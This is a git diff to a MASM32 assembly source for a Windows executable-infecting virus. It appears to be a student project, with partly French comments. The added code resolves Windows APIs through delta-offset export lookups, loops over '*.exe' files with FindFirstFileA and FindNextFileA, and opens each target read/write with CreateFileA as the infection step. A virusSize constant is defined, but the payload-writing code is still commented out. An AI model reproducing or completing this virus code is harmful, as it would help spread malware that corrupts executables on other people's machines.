@@ -9,7 +9,7 @@
 
 .386
 .model flat, stdcall
-option casemap :none
+option casemap: none
 
     include \masm32\include\windows.inc
     include \masm32\include\user32.inc
@@ -154,26 +154,34 @@ new_code_section:
     ; et passe a la suite
     ; sinon, writefile le code malveillant
 
+
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Find first file to infect
+; following filter '*.exe', exit_fail if none is found
+; no param
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 find_first:
 
-    ; find first .exe file - filter: *.exe. exit_fail if none is found
     mov     eax, ebp ; EBP -> real address of delta offset
     add     eax, offset FindFirstFile_b
     sub     eax, offset deltaoffset
 
-    ; call ent_get_function_addr with "FindFirstFile"
+    ; call ent_get_function_addr with "FindFirstFileA" (A=Ansii)
     push    eax
     push    edi ; PE header
     push    esi ; DOS header
     call    ent_get_function_addr
 
+    ; allocate sizeof(struct WIN32_FIND_DATAA) on stack
     push    ebp
     mov     ebp, esp
     sub     esp, 320
-    mov     find_data [ebp - 320], offset win32_find_data
-    push    find_data [ebp - 320]
 
-    ; push args && call the function: arg2 WIN32_FIND_DATA, arg1 filter '*.exe'
+    ; push args && call the function: arg2 WIN32_FIND_DATAA, arg1 filter '*.exe'
+    xor     ecx, ecx
+    xor     ebx, ebx
     lea     ecx, [ebp - 320]
     lea     ebx, [filter]
     push    ecx
@@ -184,19 +192,98 @@ find_first:
     cmp     eax, -1
     jz      exit_fail
 
-    ; Else save the Handle in FileHandleFind
-    mov     ebx, offset FileHandleFind
-    sub     ebx, offset deltaoffset
-    mov     ebx, eax
+    ; Else save the handle (dd) in ebx // TODO: has to be changed, too unstable
+    xor     ebx, ebx
+    mov     ebx, eax ; store handle address
+    ;push    ebx
 
-    ; TODO: successfully gets first .exe, but the registers are messed up :x
+    ; save WIN32_FIND_DATAA in edx
+    ;xor     edx, edx
+    ;lea     edx, [ebp - 320]
+    ;mov     edx, [ebp - 320]
+    ; DEBUG print first .exe found
+    ;add     edx, 44
+    ;invoke  StdOut, edx
+    ;sub     edx, 44
 
-infect_file:
-    ; nada
+    ; infect found .exe file
+    push    edi
+    push    esi
+    sub     ebp, 276
+    mov     esi, ebp
+    mov     edi, ebx
+    cld
+    mov     ecx, 260
+    rep     movsb
+    add     ebp, 276
+    pop     esi
+    pop     edi
 
+    ; restore ebp
+    mov     esp, ebp
+    pop     ebp
+
+    push    ebx
+    call    infect_file
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Find next file(s) to infect
+; following filter '*.exe', exit_fail if none is found
+; no param
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+find_next:
+    ;find next .exe file, if exists
+
+    xor     eax, eax
+    mov     eax, ebp ; EBP -> real address of delta offset
+    add     eax, offset FindNextFile_b
+    sub     eax, offset deltaoffset
+
+    ; call ent_get_function_addr with "FindNextFileA" (A=Ansii)
+    push    eax
+    push    edi ; PE header
+    push    esi ; DOS header
+    call    ent_get_function_addr
+
+    ; allocate sizeof(struct WIN32_FIND_DATAA) on stack
+    push    ebp
+    mov     ebp, esp
+    sub     esp, 320
+
+    ; push args && call the function: arg2 WIN32_FIND_DATAA,
+    ; arg1 file handle stored in ebx from FindFirstFileA
+    xor     ecx, ecx
+    xor     edx, edx
+    lea     ecx, [ebp - 320]
+    mov     edx, ebx
+    push    ecx
+    push    edx
+    call    eax
+
+    ; if no file found, exit_fail (regular exit?)
+    cmp     eax, 00h
+    jz      exit_fail
+
+    ; DEBUG print next .exe found
+    ;xor     eax, eax
+    ;lea     eax, [ebp - 276]
+    ;invoke  StdOut, eax
+
+    ; restore ebp
+    mov     esp, ebp
+    pop     ebp
+
+    xor     edx, edx
+    lea     edx, [ebp - 320]
+    ; infect next .exe file
+    call    infect_file
+
+    ; loop for more .exe files
+    jmp     find_next
+
+    ; shouldn't reach that
     call    exit_success
-
-
 
 
 
@@ -486,6 +573,70 @@ strcmp_done:
     pop     ebp
     ret     8
 
+infect_file:
+    ; infect found .exe file
+
+    ; save pointer to WIN32_FIND_DATAA
+    ;push    edx
+
+    xor     eax, eax
+    mov     eax, ebp ; EBP -> real address of delta offset
+    add     eax, offset CreateFile_b
+    sub     eax, offset deltaoffset
+
+    ; call ent_get_function_addr with "CreateFileA" (A=Ansii)
+    push    eax
+    push    edi ; PE header
+    push    esi ; DOS header
+    call    ent_get_function_addr
+
+    push    ebp
+    mov     ebp, esp
+    ; restore pointer to WIN32_FIND_DATAA
+    ;pop     edx
+
+    ; open file
+    push    00h ; no template handle
+    push    80h ; flag FILE_ATTRIBUTE_NORMAL
+    push    03h ; flag OPEN_EXISTING
+    push    00h
+    push    00h
+    push    0C0000000h ; flag GENERIC_WRITE | GENERIC_READ
+    push    [ebp + 8]
+    call    eax
+
+    ; return if file couldn't be opened
+    cmp     eax, -1 ; INVALID_HANDLE_VALUE
+    jz      end_infect_file
+
+    ; else
+    jmp     exit_success
+
+    ; set up stack frame
+    ;push    ebp
+    ;mov     ebp, esp
+    ;sub     esp, 2
+
+    ; virus size + win32_find_data.nFileSizeLow
+    ;xor     ecx, ecx
+    ;lea     ecx, [ebp - 2]
+    ;mov     ecx, virusSize ; virus size
+    ;add     edx, 38 ; win32_find_data.nFileSizeLow
+    ;add     ecx, edx
+    ;sub     edx, 38
+
+    ;mov     [ebp - 2], virusSize
+    ;add     edx, 38 ; win32_find_data.nFileSizeLow
+    ;add     [ebp - 2], edx
+    ;sub     edx, 38
+
+    ; restore ebp
+    ;mov     esp, ebp
+    ;pop     ebp
+
+    end_infect_file:
+        ret    8
+
 exit_success:
     ; WIN
     mov     eax,042h
@@ -500,6 +651,7 @@ exit_fail:
 ; @MARC: ca ne peut pas marcher sauf si tu 
 ; force la zone en r/w avec mprotect?
 virus_data:
+_data:
    filetime struct
        dwLowDateTime     DWORD     ?
        dwHighDateTime    DWORD     ?
@@ -518,17 +670,21 @@ virus_data:
        cAlternateFileName     BYTE 14  dup (?)
    find_data ends
 
-   win32_find_data find_data <?>
-   ;win32_find_data WIN32_FIND_DATAA <?>
-   FileHandleFind  dd ?
+   ;win32_find_data find_data <?>
+   win32_find_data WIN32_FIND_DATA <0>
+   ;FileHandleFind  dd ?
    filter          db "*.exe",0
    testFile        db "C:\Users\Benjamin\Documents\GitHub\donothing\TP0\donothing_2.exe",0
    testStr         db "bite",0
+   virusSize       equ jambi_end - start
 
    FindFirstFile_b db  "FindFirstFileA",0
+   FindNextFile_b  db  "FindNextFileA",0
+   CreateFile_b    db  "CreateFileA",0
    ExitProcess_b   db  "ExitProcess",0
    Beep_b          db  "Beep",0
    CreateFile_b    db  "CreateFileA",0
    WriteFIle_b     db  "WriteFile",0
 
+jambi_end:
 end start
